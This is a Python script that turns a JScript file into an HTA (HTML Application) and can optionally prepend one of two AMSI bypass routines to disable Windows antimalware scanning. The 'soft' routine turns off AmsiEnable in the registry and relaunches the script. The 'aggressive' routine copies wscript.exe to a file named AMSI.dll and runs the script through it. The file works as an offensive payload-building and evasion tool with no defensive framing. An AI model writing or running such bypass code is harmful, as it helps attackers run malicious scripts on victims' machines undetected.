import sys
import os
import argparse

def create_hta_from_jscript(jscript_file_path, amsi_bypass_mode="none"):
    """
    Wraps a JScript file's content in HTML and HTA tags to create a valid HTA script.

    Args:
        jscript_file_path (str): The path to the JScript file.
        amsi_bypass_mode (str, optional): The AMSI bypass mode.  Defaults to "none".
            Valid values are "none", "soft", or "aggressive".

    Returns:
        str: The content of the JScript file wrapped in HTA tags, or None on error.
    """
    if not os.path.exists(jscript_file_path):
        print(f"Error: JScript file not found at {jscript_file_path}")
        return None

    try:
        with open(jscript_file_path, 'r') as f:
            jscript_content = f.read()
    except Exception as e:
        print(f"Error reading JScript file: {e}")
        return None

    amsi_bypass_code = ""
    if amsi_bypass_mode == "soft":
        amsi_bypass_code = """
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
    throw new Error(1, '');
    }
}catch(e){
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}
"""
    elif amsi_bypass_mode == "aggressive":
        amsi_bypass_code = """
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
	{
		throw new Error(1, '');
	}
}
catch(e)
{
	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
	WScript.Quit(1);
}
"""

    hta_content = f"""<HTML>
<HEAD>
<TITLE>HTA from JScript</TITLE>
<HTA:APPLICATION
     APPLICATIONNAME="HTAFromJScript"
     ID="HTAFromJScript"
     VERSION="1.0"
     SINGLEINSTANCE="yes"
>
</HEAD>
<BODY>
<script language="javascript">
{amsi_bypass_code}
{jscript_content}
</script>
</BODY>
</HTML>
"""
    return hta_content

def write_hta_file(hta_content, jscript_file_path):
    """
    Writes the HTA content to a file with the same name as the JScript file, but with the .hta extension.

    Args:
        hta_content (str): The HTA content to write.
        jscript_file_path (str): The path to the JScript file (used to determine the output file name).

    Returns:
        bool: True on success, False on error.
    """
    hta_file_name = os.path.splitext(jscript_file_path)[0] + ".hta"
    try:
        with open(hta_file_name, 'w') as f:
            f.write(hta_content)
        print(f"HTA file successfully written to {hta_file_name}")
        return True
    except Exception as e:
        print(f"Error writing HTA file: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wrap JScript in HTA tags, with optional AMSI bypass.")
    parser.add_argument("jscript_file_path", help="Path to the JScript file")
    parser.add_argument("-a", "--amsi", choices=['none', 'soft', 'aggressive'], default='none', help="Include AMSI bypass code (none, soft, aggressive)")
    args = parser.parse_args()

    jscript_file_path = args.jscript_file_path
    amsi_bypass_mode = args.amsi

    hta_content = create_hta_from_jscript(jscript_file_path, amsi_bypass_mode)
    if hta_content:
        write_success = write_hta_file(hta_content, jscript_file_path)
        if not write_success:
            sys.exit(1)
    else:
        sys.exit(1)
